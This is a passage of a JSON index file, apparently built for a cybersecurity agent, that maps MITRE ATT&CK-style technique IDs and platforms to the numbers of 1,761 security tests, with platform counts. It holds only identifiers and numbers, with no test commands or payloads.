{
  "schema_version": "2.1-RAGLOX",
  "generated_for": "RAGLOX Cybersecurity Agent",
  "generated_date": "2026-01-01T05:30:57.736323",
  "statistics": {
    "total_techniques": 327,
    "total_tests": 1761,
    "platforms": {
      "windows": 1199,
      "linux": 383,
      "macos": 244,
      "azure-ad": 18,
      "office-365": 7,
      "google-workspace": 1,
      "iaas:aws": 21,
      "iaas:azure": 15,
      "iaas:gcp": 6,
      "containers": 19
    }
  },
  "quick_index": {
    "by_technique_id": {
      "T1001.002": [
        0,
        1,
        2
      ],
      "T1003": [
        3,
        4,
        5,
        6,
        7,
        8,
        9
      ],
      "T1003.001": [
        10,
        11,
        12,
        13,
        14,
        15,
        16,
        17,
        18,
        19,
        20,
        21,
        22,
        23
      ],
      "T1003.002": [
        24,
        25,
        26,
        27,
        28,
        29,
        30,
        31
      ],
      "T1003.003": [
        32,
        33,
        34,
        35,
        36,
        37,
        38,
        39,
        40
      ],
      "T1003.004": [
        41,
        42
      ],
      "T1003.005": [
        43
      ],
      "T1003.006": [
        44,
        45
      ],
      "T1003.007": [
        46,
        47,
        48,
        49
      ],
      "T1003.008": [
        50,
        51,
        52,
        53,
        54
      ],
      "T1005": [
        55,
        56,
        57
      ],
      "T1006": [
        58
      ],
      "T1007": [
        59,
        60,
        61,
        62,
        63,
        64,
        65,
        66
      ],
      "T1010": [
        67
      ],
      "T1012": [
        68,
        69,
        70,
        71,
        72,
        73
      ],
      "T1014": [
        74,
        75,
        76,
        77
      ],
      "T1016": [
        78,
        79,
        80,
        81,
        82,
        83,
        84,
        85,
        86
      ],
      "T1016.001": [
        87,
        88,
        89,
        90,
        91
      ],
      "T1016.002": [
        92
      ],
      "T1018": [
        93,
        94,
        95,
        96,
        97,
        98,
        99,
        100,
        101,
        102,
        103,
        104,
        105,
        106,
        107,
        108,
        109,
        110,
        111,
        112,
        113,
        114
      ],
      "T1020": [
        115,
        116
      ],
      "T1021.001": [
        117,
        118,
        119,
        120
      ],
      "T1021.002": [
        121,
        122,
        123,
        124
      ],
      "T1021.003": [
        125,
        126
      ],
      "T1021.004": [
        127,
        128
      ],
      "T1021.005": [
        129
      ],
      "T1021.006": [
        130,
        131,
        132
      ],
      "T1025": [
        133
      ],
      "T1027": [
        134,
        135,
        136,
        137,
        138,
        139,
        140,
        141,
        142,
        143
      ],
      "T1027.001": [
        144,
        145
      ],
      "T1027.002": [
        146,
        147,
        148,
        149
      ],
      "T1027.004": [
        150,
        151,
        152,
        153,
        154
      ],
      "T1027.006": [
        155
      ],
      "T1027.007": [
        156
      ],
      "T1027.013": [
        157,
        158
      ],
      "T1030": [
        159,
        160
      ],
      "T1033": [
        161,
        162,
        163,
        164,
        165,
        166,
        167
      ],
      "T1036": [
        168,
        169
      ],
      "T1036.003": [
        170,
        171,
        172,
        173,
        174,
        175,
        176,
        177
      ],
      "T1036.004": [
        178,
        179,
        180,
        181
      ],
      "T1036.005": [
        182,
        183,
        184
      ],
      "T1036.006": [
        185,
        186
      ],
      "T1036.007": [
        187
      ],
      "T1037.001": [
        188
      ],
      "T1037.002": [
        189
      ],
      "T1037.004": [
        190,
        191,
        192
      ],
      "T1037.005": [
        193,
        194,
        195
      ],
      "T1039": [
        196,
        197
      ],
      "T1040": [
        198,
        199,
        200,
        201,
        202,
        203,
        204,
        205,
        206,
        207,
        208,
        209,
        210,
        211,
        212,
        213
      ],
      "T1041": [
        214,
        215
      ],
      "T1046": [
        216,
        217,
        218,
        219,
        220,
        221,
        222,
        223,
        224,
        225,
        226,
        227
      ],
      "T1047": [
        228,
        229,
        230,
        231,
        232,
        233,
        234,
        235,
        236,
        237
      ],
      "T1048": [
        238,
        239,
        240,
        241
      ],
      "T1048.002": [
        242,
        243,
        244,
        245
      ],
      "T1048.003": [
        246,
        247,
        248,
        249,
        250,
        251,
        252,
        253
      ],
      "T1049": [
        254,
        255,
        256,
        257,
        258,
        259,
        260
      ],
      "T1053.002": [
        261,
        262,
        263
      ],
      "T1053.003": [
        264,
        265,
        266,
        267
      ],
      "T1053.005": [
        268,
        269,
        270,
        271,
        272,
        273,
        274,
        275,
        276,
        277,
        278,
        279
      ],
      "T1053.006": [
        280,
        281,
        282
      ],
      "T1053.007": [
        283,
        284
      ],
      "T1055": [
        285,
        286,
        287,
        288,
        289,
        290,
        291,
        292,
        293,
        294,
        295,
        296,
        297
      ],
      "T1055.001": [
        298,
        299
      ],
      "T1055.002": [
        300
      ],
      "T1055.003": [
        301
      ],
      "T1055.004": [
        302,
        303,
        304
      ],
      "T1055.011": [
        305
      ],
      "T1055.012": [
        306,
        307,
        308,
        309
      ],
      "T1055.015": [
        310
      ],
      "T1056.001": [
        311,
        312,
        313,
        314,
        315,
        316,
        317,
        318
      ],
      "T1056.002": [
        319,
        320,
        321
      ],
      "T1056.004": [
        322
      ],
      "T1057": [
        323,
        324,
        325,
        326,
        327,
        328,
        329,
        330,
        331
      ],
      "T1059": [
        332
      ],
      "T1059.001": [
        333,
        334,
        335,
        336,
        337,
        338,
        339,
        340,
        341,
        342,
        343,
        344,
        345,
        346,
        347,
        348,
        349,
        350,
        351,
        352,
        353,
        354
      ],
      "T1059.002": [
        355
      ],
      "T1059.003": [
        356,
        357,
        358,
        359,
        360,
        361
      ],
      "T1059.004": [
        362,
        363,
        364,
        365,
        366,
        367,
        368,
        369,
        370,
        371,
        372,
        373,
        374,
        375,
        376,
        377,
        378
      ],
      "T1059.005": [
        379,
        380,
        381
      ],
      "T1059.006": [
        382,
        383,
        384,
        385
      ],
      "T1059.007": [
        386,
        387
      ],
      "T1059.010": [
        388
      ],
      "T1069.001": [
        389,
        390,
        391,
        392,
        393,
        394,
        395
      ],
      "T1069.002": [
        396,
        397,
        398,
        399,
        400,
        401,
        402,
        403,
        404,
        405,
        406,
        407,
        408,
        409,
        410
      ],
      "T1070": [
        411,
        412
      ],
      "T1070.001": [
        413,
        414,
        415
      ],
      "T1070.002": [
        416,
        417,
        418,
        419,
        420,
        421,
        422,
        423,
        424,
        425,
        426,
        427,
        428,
        429,
        430,
        431,
        432,
        433,
        434,
        435
      ],
      "T1070.003": [
        436,
        437,
        438,
        439,
        440,
        441,
        442,
        443,
        444,
        445,
        446,
        447,
        448,
        449
      ],
      "T1070.004": [
        450,
        451,
        452,
        453,
        454,
        455,
        456,
        457,
        458,
        459,
        460
      ],
      "T1070.005": [
        461,
        462,
        463,
        464,
        465
      ],
      "T1070.006": [
        466,
        467,
        468,
        469,
        470,
        471,
        472,
        473,
        474,
        475
      ],
      "T1070.008": [
        476,
        477,
        478,
        479,
        480,
        481
      ],
      "T1071": [
        482
      ],
      "T1071.001": [
        483,
        484,
        485
      ],
      "T1071.004": [
        486,
        487,
        488,
        489
      ],
      "T1072": [
        490,
        491,
        492
      ],
      "T1074.001": [
        493,
        494,
        495
      ],
      "T1078.001": [
        496,
        497,
        498
      ],
      "T1078.003": [
        499,
        500,
        501,
        502,
        503,
        504,
        505,
        506,
        507,
        508,
        509,
        510,
        511
      ],
      "T1078.004": [
        512,
        513,
        514
      ],
      "T1082": [
        515,
        516,
        517,
        518,
        519,
        520,
        521,
        522,
        523,
        524,
        525,
        526,
        527,
        528,
        529,
        530,
        531,
        532,
        533,
        534,
        535,
        536,
        537,
        538,
        539,
        540,
        541,
        542,
        543,
        544,
        545,
        546,
        547,
        548,
        549,
        550,
        551,
        552,
        553,
        554
      ],
      "T1083": [
        555,
        556,
        557,
        558,
        559,
        560,
        561,
        562,
        563
      ],
      "T1087.001": [
        564,
        565,
        566,
        567,
        568,
        569,
        570,
        571,
        572,
        573,
        574
      ],
      "T1087.002": [
        575,
        576,
        577,
        578,
        579,
        580,
        581,
        582,
        583,
        584,
        585,
        586,
        587,
        588,
        589,
        590,
        591,
        592,
        593,
        594,
        595,
        596,
        597,
        598
      ],
      "T1090.001": [
        599,
        600,
        601
      ],
      "T1090.003": [
        602,
        603,
        604,
        605
      ],
      "T1091": [
        606
      ],
      "T1095": [
        607,
        608,
        609,
        610
      ],
      "T1098": [
        611,
        612,
        613,
        614,
        615,
        616,
        617,
        618,
        619,
        620,
        621,
        622,
        623,
        624,
        625,
        626,
        627
      ],
      "T1098.001": [
        628,
        629,
        630
      ],
      "T1098.002": [
        631
      ],
      "T1098.003": [
        632,
        633
      ],
      "T1098.004": [
        634
      ],
      "T1105": [
        635,
        636,
        637,
        638,
        639,
        640,
        641,
        642,
        643,
        644,
        645,
        646,
        647,
        648,
        649,
        650,
        651,
        652,
        653,
        654,
        655,
        656,
        657,
        658,
        659,
        660,
        661,
        662,
        663,
        664,
        665,
        666,
        667,
        668,
        669,
        670,
        671,
        672,
        673
      ],
      "T1106": [
        674,
        675,
        676,
        677,
        678
      ],
      "T1110.001": [
        679,
        680,
        681,
        682,
        683,
        684,
        685,
        686
      ],
      "T1110.002": [
        687
      ],
      "T1110.003": [
        688,
        689,
        690,
        691,
        692,
        693,
        694,
        695,
        696
      ],
      "T1110.004": [
        697,
        698,
        699,
        700
      ],
      "T1112": [
        701,
        702,
        703,
        704,
        705,
        706,
        707,
        708,
        709,
        710,
        711,
        712,
        713,
        714,
        715,
        716,
        717,
        718,
        719,
        720,
        721,
        722,
        723,
        724,
        725,
        726,
        727,
        728,
        729,
        730,
        731,
        732,
        733,
        734,
        735,
        736,
        737,
        738,
        739,
        740,
        741,
        742,
        743,
        744,
        745,
        746,
        747,
        748,
        749,
        750,
        751,
        752,
        753,
        754,
        755,
        756,
        757,
        758,
        759,
        760,
        761,
        762,
        763,
        764,
        765,
        766,
        767,
        768,
        769,
        770,
        771,
        772,
        773,
        774,
        775,
        776,
        777,
        778,
        779,
        780,
        781,
        782,
        783,
        784,
        785,
        786,
        787,
        788,
        789,
        790
      ],
      "T1113": [
        791,
        792,
        793,
        794,
        795,
        796,
        797,
        798,
        799
      ],
      "T1114.001": [
        800
      ],
      "T1114.002": [
        801
      ],
      "T1114.003": [
        802
      ],
      "T1115": [
        803,
        804,
        805,
        806,
        807
      ],
      "T1119": [
        808,
        809,
        810,
        811
      ],
      "T1120": [
        812,
        813,
        814,
        815
      ],
      "T1123": [
        816,
        817,
        818
      ],
      "T1124": [
        819,
        820,
        821,
        822,
        823,
        824
      ],
      "T1125": [
        825
      ],
      "T1127": [
        826,
        827
      ],
      "T1127.001": [
        828,
        829
      ],
      "T1129": [
        830
      ],
      "T1132.001": [
        831,
        832,
        833
      ],
      "T1133": [
        834
      ],
      "T1134.001": [
        835,
        836,
        837,
        838,
        839
      ],
      "T1134.002": [
        840,
        841
      ],
      "T1134.004": [
        842,
        843,
        844,
        845,
        846
      ],
      "T1134.005": [
        847
      ],
      "T1135": [
        848,
        849,
        850,
        851,
        852,
        853,
        854,
        855,
        856,
        857,
        858,
        859
      ],
      "T1136.001": [
        860,
        861,
        862,
        863,
        864,
        865,
        866,
        867,
        868,
        869
      ],
      "T1136.002": [
        870,
        871,
        872,
        873,
        874
      ],
      "T1136.003": [
        875,
        876,
        877
      ],
      "T1137": [
        878
      ],
      "T1137.001": [
        879
      ],
      "T1137.002": [
        880
      ],
      "T1137.004": [
        881
      ],
      "T1137.006": [
        882,
        883,
        884,
        885,
        886
      ],
      "T1140": [
        887,
        888,
        889,
        890,
        891,
        892,
        893,
        894,
        895,
        896,
        897
      ],
      "T1176": [
        898,
        899,
        900,
        901,
        902
      ],
      "T1187": [
        903,
        904,
        905
      ],
      "T1195": [
        906
      ],
      "T1195.002": [
        907
      ],
      "T1197": [
        908,
        909,
        910,
        911
      ],
      "T1201": [
        912,
        913,
        914,
        915,
        916,
        917,
        918,
        919,
        920,
        921,
        922,
        923
      ],
      "T1202": [
        924,
        925,
        926,
        927,
        928
      ],
      "T1204.002": [
        929,
        930,
        931,
        932,
        933,
        934,
        935,
        936,
        937,
        938,
        939,
        940,
        941
      ],
      "T1204.003": [
        942
      ],
      "T1207": [
        943
      ],
      "T1216": [
        944,
        945
      ],
      "T1216.001": [
        946
      ],
      "T1217": [
        947,
        948,
        949,
        950,
        951,
        952,
        953,
        954,
        955,
        956,
        957
      ],
      "T1218": [
        958,
        959,
        960,
        961,
        962,
        963,
        964,
        965,
        966,
        967,
        968,
        969,
        970,
        971,
        972,
        973
      ],
      "T1218.001": [
        974,
        975,
        976,
        977,
        978,
        979,
        980,
        981
      ],
      "T1218.002": [
        982
      ],
      "T1218.003": [
        983,
        984
      ],
      "T1218.004": [
        985,
        986,
        987,
        988,
        989,
        990,
        991,
        992
      ],
      "T1218.005": [
        993,
        994,
        995,
        996,
        997,
        998,
        999,
        1000,
        1001,
        1002
      ],
      "T1218.007": [
        1003,
        1004,
        1005,
        1006,
        1007,
        1008,
        1009,
        1010,
        1011,
        1012,
        1013
      ],
      "T1218.008": [
        1014,
        1015
      ],
      "T1218.009": [
        1016,
        1017
      ],
      "T1218.010": [
        1018,
        1019,
        1020,
        1021,
        1022
      ],
      "T1218.011": [
        1023,
        1024,
        1025,
        1026,
        1027,
        1028,
        1029,
        1030,
        1031,
        1032,
        1033,
        1034,
        1035,
        1036,
        1037,
        1038
      ],
      "T1219": [
        1039,
        1040,
        1041,
        1042,
        1043,
        1044,
        1045,
        1046,
        1047,
        1048,
        1049,
        1050,
        1051,
        1052,
        1053
      ],
      "T1220": [
        1054,
        1055,
        1056,
        1057
      ],
      "T1221": [
        1058
      ],
      "T1222": [
        1059,
        1060,
        1061
      ],
      "T1222.001": [
        1062,
        1063,
        1064,
        1065,
        1066,
        1067
      ],
      "T1222.002": [
        1068,
        1069,
        1070,
        1071,
        1072,
        1073,
        1074,
        1075,
        1076,
        1077,
        1078,
        1079,
        1080,
        1081
      ],
      "T1482": [
        1082,
        1083,
        1084,
        1085,
        1086,
        1087,
        1088,
        1089
      ],
      "T1484.001": [
        1090,
        1091
      ],
      "T1484.002": [
        1092
      ],
      "T1485": [
        1093,
        1094,
        1095,
        1096,
        1097
      ],
      "T1486": [
        1098,
        1099,
        1100,
        1101,
        1102,
        1103,
        1104,
        1105,
        1106,
        1107
      ],
      "T1489": [
        1108,
        1109,
        1110,
        1111,
        1112,
        1113,
        1114,
        1115
      ],
      "T1490": [
        1116,
        1117,
        1118,
        1119,
        1120,
        1121,
        1122,
        1123,
        1124,
        1125,
        1126,
        1127
      ],
      "T1491.001": [
        1128,
        1129,
        1130,
        1131
      ],
      "T1496": [
        1132
      ],
      "T1497.001": [
        1133,
        1134,
        1135,
        1136,
        1137,
        1138,
        1139,
        1140
      ],
      "T1497.003": [
        1141
      ],
      "T1505.002": [
        1142
      ],
      "T1505.003": [
        1143
      ],
      "T1505.004": [
        1144,
        1145
      ],
      "T1505.005": [
        1146,
        1147
      ],
      "T1518": [
        1148,
        1149,
        1150,
        1151,
        1152,
        1153
      ],
      "T1518.001": [
        1154,
        1155,
        1156,
        1157,
        1158,
        1159,
        1160,
        1161,
        1162,
        1163,
        1164
      ],
      "T1526": [
        1165,
        1166,
        1167
      ],
      "T1528": [
        1168,
        1169
      ],
      "T1529": [
        1170,
        1171,
        1172,
        1173,
        1174,
        1175,
        1176,
        1177,
        1178,
        1179,
        1180,
        1181,
        1182,
        1183,
        1184,
        1185
      ],
      "T1530": [
        1186,
        1187
      ],
      "T1531": [
        1188,
        1189,
        1190,
        1191,
        1192,
        1193,
        1194,
        1195
      ],
      "T1539": [
        1196,
        1197,
        1198,
        1199,
        1200
      ],
      "T1542.001": [
        1201
      ],
      "T1543.001": [
        1202,
        1203,
        1204
      ],
      "T1543.002": [
        1205,
        1206,
        1207
      ],
      "T1543.003": [
        1208,
        1209,
        1210,
        1211,
        1212,
        1213
      ],
      "T1543.004": [
        1214
      ],
      "T1546": [
        1215,
        1216,
        1217,
        1218,
        1219,
        1220,
        1221,
        1222,
        1223
      ],
      "T1546.001": [
        1224
      ],
      "T1546.002": [
        1225
      ],
      "T1546.003": [
        1226,
        1227,
        1228
      ],
      "T1546.004": [
        1229,
        1230,
        1231,
        1232,
        1233,
        1234,
        1235
      ],
      "T1546.005": [
        1236,
        1237,
        1238,
        1239
      ],
      "T1546.007": [
        1240
      ],
      "T1546.008": [
        1241,
        1242,
        1243,
        1244,
        1245,
        1246,
        1247,
        1248,
        1249,
        1250
      ],
      "T1546.009": [
        1251
      ],
      "T1546.010": [
        1252
      ],
      "T1546.011": [
        1253,
        1254,
        1255
      ],
      "T1546.012": [
        1256,
        1257,
        1258
      ],
      "T1546.013": [
        1259
      ],
      "T1546.014": [
        1260
      ],
      "T1546.015": [
        1261,
        1262,
        1263,
        1264
      ],
      "T1547": [
        1265,
        1266,
        1267
      ],
      "T1547.001": [
        1268,
        1269,
        1270,
        1271,
        1272,
        1273,
        1274,
        1275,
        1276,
        1277,
        1278,
        1279,
        1280,
        1281,
        1282,
        1283,
        1284,
        1285,
        1286,
        1287
      ],
      "T1547.002": [
        1288
      ],
      "T1547.003": [
        1289,
        1290
      ],
      "T1547.004": [
        1291,
        1292,
        1293,
        1294,
        1295
      ],
      "T1547.005": [
        1296,
        1297
      ],
      "T1547.006": [
        1298,
        1299,
        1300,
        1301
      ],
      "T1547.007": [
        1302,
        1303,
        1304
      ],
      "T1547.008": [
        1305
      ],
      "T1547.009": [
        1306,
        1307
      ],
      "T1547.010": [
        1308
      ],
      "T1547.012": [
        1309
      ],
      "T1547.014": [
        1310,
        1311,
        1312
      ],
      "T1547.015": [
        1313,
        1314
      ],
      "T1548.001": [
        1315,
        1316,
        1317,
        1318,
        1319,
        1320,
        1321,
        1322,
        1323,
        1324
      ],
      "T1548.002": [
        1325,
        1326,
        1327,
        1328,
        1329,
        1330,
        1331,
        1332,
        1333,
        1334,
        1335,
        1336,
        1337,
        1338,
        1339,
        1340,
        1341,
        1342,
        1343,
        1344,
        1345,
        1346,
        1347,
        1348,
        1349,
        1350,
        1351
      ],
      "T1548.003": [
        1352,
        1353,
        1354,
        1355,
        1356,
        1357
      ],
      "T1550.002": [
        1358,
        1359,
        1360
      ],
      "T1550.003": [
        1361,
        1362
      ],
      "T1552": [
        1363,
        1364
      ],
      "T1552.001": [
        1365,
        1366,
        1367,
        1368,
        1369,
        1370,
        1371,
        1372,
        1373,
        1374,
        1375,
        1376,
        1377,
        1378,
        1379,
        1380,
        1381
      ],
      "T1552.002": [
        1382,
        1383
      ],
      "T1552.003": [
        1384,
        1385
      ],
      "T1552.004": [
        1386,
        1387,
        1388,
        1389,
        1390,
        1391,
        1392,
        1393,
        1394,
        1395,
        1396,
        1397,
        1398,
        1399
      ],
      "T1552.005": [
        1400,
        1401
      ],
      "T1552.006": [
        1402,
        1403
      ],
      "T1552.007": [
        1404,
        1405,
        1406
      ],
      "T1553.001": [
        1407
      ],
      "T1553.003": [
        1408
      ],
      "T1553.004": [
        1409,
        1410,
        1411,
        1412,
        1413,
        1414,
        1415
      ],
      "T1553.005": [
        1416,
        1417,
        1418,
        1419
      ],
      "T1553.006": [
        1420
      ],
      "T1555": [
        1421,
        1422,
        1423,
        1424,
        1425,
        1426,
        1427,
        1428
      ],
      "T1555.001": [
        1429,
        1430,
        1431,
        1432
      ],
      "T1555.003": [
        1433,
        1434,
        1435,
        1436,
        1437,
        1438,
        1439,
        1440,
        1441,
        1442,
        1443,
        1444,
        1445,
        1446,
        1447,
        1448,
        1449
      ],
      "T1555.004": [
        1450,
        1451
      ],
      "T1555.006": [
        1452
      ],
      "T1556.002": [
        1453,
        1454
      ],
      "T1556.003": [
        1455,
        1456,
        1457
      ],
      "T1557.001": [
        1458
      ],
      "T1558.001": [
        1459,
        1460
      ],
      "T1558.002": [
        1461
      ],
      "T1558.003": [
        1462,
        1463,
        1464,
        1465,
        1466,
        1467,
        1468
      ],
      "T1558.004": [
        1469,
        1470,
        1471
      ],
      "T1559": [
        1472,
        1473,
        1474,
        1475,
        1476
      ],
      "T1559.002": [
        1477,
        1478,
        1479
      ],
      "T1560": [
        1480
      ],
      "T1560.001": [
        1481,
        1482,
        1483,
        1484,
        1485,
        1486,
        1487,
        1488,
        1489,
        1490,
        1491,
        1492
      ],
      "T1560.002": [
        1493,
        1494,
        1495,
        1496
      ],
      "T1562": [
        1497,
        1498,
        1499
      ],
      "T1562.001": [
        1500,
        1501,
        1502,
        1503,
        1504,
        1505,
        1506,
        1507,
        1508,
        1509,
        1510,
        1511,
        1512,
        1513,
        1514,
        1515,
        1516,
        1517,
        1518,
        1519,
        1520,
        1521,
        1522,
        1523,
        1524,
        1525,
        1526,
        1527,
        1528,
        1529,
        1530,
        1531,
        1532,
        1533,
        1534,
        1535,
        1536,
        1537,
        1538,
        1539,
        1540,
        1541,
        1542,
        1543,
        1544,
        1545,
        1546,
        1547,
        1548,
        1549,
        1550,
        1551,
        1552,
        1553,
        1554,
        1555,
        1556,
        1557,
        1558
      ],
      "T1562.002": [
        1559,
        1560,
        1561,
        1562,
        1563,
        1564,
        1565,
        1566,
        1567,
        1568
      ],
      "T1562.003": [
        1569,
        1570,
        1571,
        1572,
        1573,
        1574,
        1575,
        1576,
        1577,
        1578,
        1579,
        1580
      ],
      "T1562.004": [
        1581,
        1582,
        1583,
        1584,
        1585,
        1586,
        1587,
        1588,
        1589,
        1590,
        1591,
        1592,
        1593,
        1594,
        1595,
        1596,
        1597,
        1598,
        1599,
        1600,
        1601,
        1602,
        1603,
        1604,
        1605
      ],
      "T1562.006": [
        1606,
        1607,
        1608,
        1609,
        1610,
        1611,
        1612,
        1613,
        1614,
        1615,
        1616,
        1617,
        1618,
        1619
      ],
      "T1562.008": [
        1620,
        1621,
        1622,
        1623,
        1624,
        1625,
        1626,
        1627,
        1628,
        1629
      ],
      "T1562.009": [
        1630
      ],
      "T1562.010": [
        1631,
        1632,
        1633
      ],
      "T1562.012": [
        1634,
        1635
      ],
      "T1563.002": [
        1636
      ],
      "T1564": [
        1637,
        1638,
        1639,
        1640,
        1641
      ],
      "T1564.001": [
        1642,
        1643,
        1644,
        1645,
        1646,
        1647,
        1648,
        1649,
        1650,
        1651
      ],
      "T1564.002": [
        1652,
        1653,
        1654
      ],
      "T1564.003": [
        1655,
        1656,
        1657
      ],
      "T1564.004": [
        1658,
        1659,
        1660,
        1661,
        1662
      ],
      "T1564.006": [
        1663,
        1664,
        1665
      ],
      "T1564.008": [
        1666
      ],
      "T1566.001": [
        1667,
        1668
      ],
      "T1566.002": [
        1669
      ],
      "T1567.002": [
        1670,
        1671
      ],
      "T1567.003": [
        1672
      ],
      "T1569.001": [
        1673
      ],
      "T1569.002": [
        1674,
        1675,
        1676,
        1677,
        1678,
        1679,
        1680,
        1681
      ],
      "T1570": [
        1682,
        1683
      ],
      "T1571": [
        1684,
        1685
      ],
      "T1572": [
        1686,
        1687,
        1688,
        1689,
        1690,
        1691,
        1692
      ],
      "T1573": [
        1693
      ],
      "T1574.001": [
        1694,
        1695,
        1696,
        1697,
        1698,
        1699
      ],
      "T1574.006": [
        1700,
        1701,
        1702
      ],
      "T1574.008": [
        1703
      ],
      "T1574.009": [
        1704
      ],
      "T1574.011": [
        1705,
        1706
      ],
      "T1574.012": [
        1707,
        1708,
        1709
      ],
      "T1578.001": [
        1710,
        1711,
        1712
      ],
      "T1580": [
        1713,
        1714
      ],
      "T1592.001": [
        1715
      ],
      "T1595.003": [
        1716
      ],
      "T1606.002": [
        1717
      ],
      "T1609": [
        1718,
        1719
      ],
      "T1610": [
        1720
      ],
      "T1611": [
        1721,
        1722,
        1723
      ],
      "T1612": [
        1724
      ],
      "T1613": [
        1725,
        1726
      ],
      "T1614": [
        1727,
        1728
      ],
      "T1614.001": [
        1729,
        1730,
        1731,
        1732,
        1733,
        1734,
        1735,
        1736,
        1737,
        1738
      ],
      "T1615": [
        1739,
        1740,
        1741,
        1742,
        1743
      ],
      "T1619": [
        1744,
        1745,
        1746,
        1747
      ],
      "T1620": [
        1748
      ],
      "T1622": [
        1749
      ],
      "T1647": [
        1750
      ],
      "T1648": [
        1751
      ],
      "T1649": [
        1752
      ],
      "T1651": [
        1753
      ],
      "T1652": [
        1754,
        1755,
        1756,
        1757,
        1758
      ],
      "T1654": [
        1759,
        1760
      ]
    },
    "by_platform": {
      "windows": [
        0,
        1,
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        12,
        13,
        14,
        15,
        16,
        17,
        18,
        19,
        20,
        21,
        22,
        23,
        24,
        25,
        26,
        27,
        28,
        29,
        30,
        31,
        32,
        33,
        34,
        35,
        36,
        37,
        38,
        39,
        40,
        41,
        42,
        43,
        44,
        45,
        55,
        58,
        59,
        60,
        62,
        64,
        65,
        67,
        68,
        69,
        70,
        71,
        72,
        73,
        78,
        79,
        81,
        82,
        83,
        84,
        86,
        87,
        89,
        90,
        91,
        92,
        93,
        94,
        95,
        96,
        97,
        100,
        101,
        102,
        103,
        108,
        109,
        110,
        111,
        112,
        113,
        114,
        115,
        116,
        117,
        118,
        119,
        120,
        121,
        122,
        123,
        124,
        125,
        126,
        127,
        128,
        130,
        131,
        132,
        133,
        135,
        136,
        137,
        138,
        139,
        140,
        141,
        142,
        143,
        150,
        151,
        155,
        156,
        157,
        158,
        160,
        161,
        163,
        164,
        165,
        166,
        167,
        168,
        169,
        170,
        172,
        173,
        174,
        175,
        176,
        177,
        178,
        179,
        183,
        184,
        187,
        188,
        196,
        197,
        201,
        202,
        203,
        204,
        213,
        214,
        215,
        218,
        219,
        220,
        221,
        222,
        223,
        225,
        226,
        228,
        229,
        230,
        231,
        232,
        233,
        234,
        235,
        236,
        237,
        240,
        242,
        247,
        249,
        250,
        251,
        252,
        254,
        255,
        256,
        260,
        261,
        268,
        269,
        270,
        271,
        272,
        273,
        274,
        275,
        276,
        277,
        278,
        279,
        285,
        286,
        287,
        288,
        289,
        290,
        291,
        292,
        293,
        294,
        295,
        296,
        297,
        298,
        299,
        300,
        301,
        302,
        303,
        304,
        305,
        306,
        307,
        308,
        309,
        310,
        311,
        320,
        322,
        324,
        325,
        326,
        327,
        328,
        329,
        330,
        331,
        332,
        333,
        334,
        335,
        336,
        337,
        338,
        339,
        340,
        341,
        342,
        343,
        344,
        345,
        346,
        347,
        348,
        349,
        350,
        351,
        352,
        353,
        354,
        356,
        357,
        358,
        359,
        360,
        361,
        379,
        380,
        381,
        386,
        387,
        388,
        390,
        391,
        392,
        393,
        394,
        396,
        397,
        398,
        399,
        400,
        401,
        402,
        403,
        404,
        405,
        406,
        407,
        408,
        409,
        411,
        412,
        413,
        414,
        415,
        446,
        447,
        448,
        449,
        453,
        454,
        455,
        456,
        458,
        459,
        460,
        461,
        462,
        463,
        464,
        465,
        470,
        471,
        472,
        473,
        475,
        476,
        479,
        482,
        483,
        484,
        486,
        487,
        488,
        489,
        490,
        491,
        492,
        493,
        495,
        496,
        497,
        499,
        504,
        505,
        511,
        515,
        521,
        523,
        524,
        525,
        528,
        529,
        530,
        531,
        532,
        533,
        534,
        535,
        536,
        537,
        541,
        542,
        543,
        544,
        545,
        546,
        548,
        549,
        550,
        551,
        552,
        553,
        554,
        555,
        556,
        559,
        560,
        561,
        563,
        571,
        572,
        573,
        574,
        575,
        576,
        577,
        578,
        579,
        580,
        581,
        582,
        583,
        584,
        585,
        586,
        587,
        588,
        589,
        590,
        591,
        592,
        593,
        594,
        595,
        596,
        601,
        602,
        603,
        606,
        607,
        608,
        609,
        611,
        612,
        619,
        620,
        621,
        622,
        623,
        624,
        625,
        626,
        641,
        642,
        643,
        644,
        645,
        646,
        647,
        649,
        650,
        651,
        652,
        653,
        654,
        655,
        656,
        657,
        658,
        659,
        660,
        662,
        663,
        664,
        666,
        667,
        668,
        669,
        670,
        671,
        672,
        674,
        675,
        676,
        677,
        678,
        679,
        680,
        682,
        686,
        687,
        688,
        689,
        690,
        692,
        693,
        695,
        700,
        701,
        702,
        703,
        704,
        705,
        706,
        707,
        708,
        709,
        710,
        711,
        712,
        713,
        714,
        715,
        716,
        717,
        718,
        719,
        720,
        721,
        722,
        723,
        724,
        725,
        726,
        727,
        728,
        729,
        730,
        731,
        732,
        733,
        734,
        735,
        736,
        737,
        738,
        739,
        740,
        741,
        742,
        743,
        744,
        745,
        746,
        747,
        748,
        749,
        750,
        751,
        752,
        753,
        754,
        755,
        756,
        757,
        758,
        759,
        760,
        761,
        762,
        763,
        764,
        765,
        766,
        767,
        768,
        769,
        770,
        771,
        772,
        773,
        774,
        775,
        776,
        777,
        778,
        779,
        780,
        781,
        782,
        783,
        784,
        785,
        786,
        787,
        788,
        789,
        790,
        797,
        798,
        799,
        800,
        803,
        804,
        806,
        808,
        809,
        810,
        811,
        812,
        813,
        814,
        815,
        816,
        817,
        819,
        820,
        822,
        823,
        824,
        825,
        826,
        827,
        828,
        829,
        830,
        833,
        834,
        835,
        836,
        837,
        838,
        839,
        840,
        841,
        842,
        843,
        844,
        845,
        846,
        847,
        851,
        852,
        853,
        854,
        855,
        856,
        857,
        858,
        859,
        863,
        864,
        867,
        868,
        870,
        871,
        872,
        878,
        879,
        880,
        881,
        882,
        883,
        884,
        885,
        886,
        887,
        888,
        897,
        898,
        899,
        900,
        901,
        902,
        903,
        904,
        905,
        906,
        908,
        909,
        910,
        911,
        917,
        918,
        920,
        921,
        922,
        924,
        925,
        926,
        927,
        928,
        929,
        930,
        931,
        932,
        933,
        934,
        935,
        936,
        937,
        938,
        939,
        940,
        941,
        942,
        943,
        944,
        945,
        946,
        951,
        952,
        953,
        954,
        956,
        957,
        958,
        959,
        960,
        961,
        962,
        963,
        964,
        965,
        966,
        967,
        968,
        969,
        970,
        971,
        972,
        973,
        974,
        975,
        976,
        977,
        978,
        979,
        980,
        981,
        982,
        983,
        984,
        985,
        986,
        987,
        988,
        989,
        990,
        991,
        992,
        993,
        994,
        995,
        996,
        997,
        998,
        999,
        1000,
        1001,
        1002,
        1003,
        1004,
        1005,
        1006,
        1007,
        1008,
        1009,
        1010,
        1011,
        1012,
        1013,
